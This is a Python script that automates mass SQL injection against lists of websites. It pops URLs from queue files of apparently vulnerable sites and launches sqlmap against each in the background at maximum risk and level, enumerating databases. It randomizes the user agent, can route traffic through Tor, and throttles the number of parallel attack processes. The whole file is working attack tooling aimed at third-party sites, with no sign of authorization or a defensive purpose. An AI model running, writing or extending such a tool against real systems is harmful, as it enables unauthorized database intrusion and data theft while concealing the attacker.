import time
import sys
import os
import re
from random import randint
from urllib import request
from selenium.common.exceptions import TimeoutException
from selenium import webdriver
from selenium.common.exceptions import NoSuchWindowException
import _thread



BANNED_KEYWORDS = []


TOR=os.getenv("TOR")=="True"
MAX_THREADS=int(os.getenv("MAX_THREADS"))
PRIORITY_FILE=os.getenv("PRIORITY_FILE")
ERROR_FILE=os.getenv("ERROR_FILE")
SQLMAP_PATH=os.getenv("SQLMAP_PATH")

def get_domain_name(link):#
	if link[-1] == '\n':
		link = link[:-1]
	x = link
	x = x[x.find('//') + 2:]
	if x.find('/') != -1:
		x = x[:x.find('/')]

	if x[0:4] == 'www.':
		x = x[4:]

	result = x[x.rfind("."):]

	x = x[0:x.rfind(".")]

	if x.rfind(".") == -1:
		result = x + result
	else:
		result = x[x.rfind(".") + 1:] + result
	return result




def get_site(file_name):#

	#while lock:
	#	print("waiting for %s To be Unlocked" % (file_name))
	#lock = True

	files = open(file_name, "r")
	sites = files.readlines()
	files.close()
	site = sites[0]
	del sites[0]

	files = open(file_name, "w")
	if len(sites) > 0:
		files.writelines(sites)
	files.close()

	#lock = False

	return site


def get_sites(file_name):#

	#while lock:
	#	print("waiting for %s To be Unlocked" % (file_name))
	#lock = True

	files = open(file_name, "r")
	sites = files.readlines()

	return sites


def get_number(file_name):#

	#while lock:
	#	print("waiting for %d To be Unlocked" % (file_name))
	#lock = True
#
	files = open(file_name, "r")
	sites = files.readlines()
	files.close()

	#lock = False

	return len(sites)


def exploit():

	priority_file_number = get_number(PRIORITY_FILE)

	error_file_number = get_number(ERROR_FILE)

	os.system("mkdir working")
	os.system("mkdir finished")
	os.system("mkdir dbs")
	os.system("mkdir maybe")
	while priority_file_number == 0 and error_file_number == 0:
		print( "Waiting for sites to come\n" )
		time.sleep(60)

		priority_file_number = get_number(PRIORITY_FILE)

		error_file_number = get_number(ERROR_FILE)

	while priority_file_number > 0 or error_file_number > 0:

		while get_sqlmap_threads() > MAX_THREADS:
			print("Waiting for others to finish exploit\n")
			time.sleep(100)

		else:

			if priority_file_number > 0:
				site = get_site(PRIORITY_FILE)

			else:
				site = get_site(ERROR_FILE)

			priority_file_number = get_number(PRIORITY_FILE)

			error_file_number = get_number(ERROR_FILE)

			if site[len(site) - 1] == '\n':
				site = site[0:len(site) - 1]
			site_file = get_domain_name(site)
			random_int1 = randint(0, 9)
			random_int2 = randint(0, 9)
			print("executing exploit for " +site_file +"\n")
			if TOR:
				command = ' ( echo "%s" >  working/%s.%s.txt ;  nohup python %ssqlmap.py  --tor --tor-type=SOCKS5 -u "%s" --batch --risk 3 --level 5 --random-agent --dbs >> working/%s.%s.txt ; mv working/%s.%s.txt finished/%s.%s.txt ) & ' % (site, site_file,str(random_int1) + str(random_int2), SQLMAP_PATH + "/sqlmap/", site, site_file, str(random_int1) + str(random_int2), site_file, str(random_int1) + str(random_int2), site_file, str(random_int1) + str(random_int2))
			else:
				command = ' ( echo "%s" >  working/%s.%s.txt ;  nohup python %ssqlmap.py -u "%s" --batch --risk 3 --level 5 --random-agent --dbs >> working/%s.%s.txt ; mv working/%s.%s.txt finished/%s.%s.txt ) & ' % (site, site_file,str(random_int1) + str(random_int2), SQLMAP_PATH + "/sqlmap/", site, site_file, str(random_int1) + str(random_int2), site_file, str(random_int1) + str(random_int2), site_file, str(random_int1) + str(random_int2))
			os.system(command)
			while priority_file_number == 0 and error_file_number == 0:
				print( "Waiting for sites to come\n" )
				time.sleep(50)

				priority_file_number = get_number(PRIORITY_FILE)

				error_file_number = get_number(ERROR_FILE)

	else:
		print( "no sites to test" )






def get_sqlmap_threads():#
	return int(int(os.popen("ps aux | grep sqlmap | sed -E '/sh -c/d' | sed -E '/grep/d' | wc -l | sed -E 's/ *//'").readline()[0:-1]))

def main():
	exit_err=False
	if PRIORITY_FILE==None:
		print("Error : You need to set PRIORITY_FILE\nTry : export PRIORITY_FILE=\"sqlVulnerable.txt\"")
		exit_err=True
	if ERROR_FILE==None:
		print("Error : You need to set ERROR_FILE\nTry : export ERROR_FILE=\"maybeVulnerable.txt\"")
		exit_err=True
	if MAX_THREADS==None:
		print("Error : You need to set MAX_THREADS\nTry : export MAX_THREADS=4")
		exit_err=True
	if TOR==None:
		print("Error : You need to set TOR\nTry : export TOR=False")
		exit_err=True
	if SQLMAP_PATH==None:
		print("Error : You need to set SQLMAP_PATH\nTry : export SQLMAP_PATH=.")
		exit_err=True

	if exit_err:
		exit(-1)
	exploit()

if __name__ == '__main__':
	main()
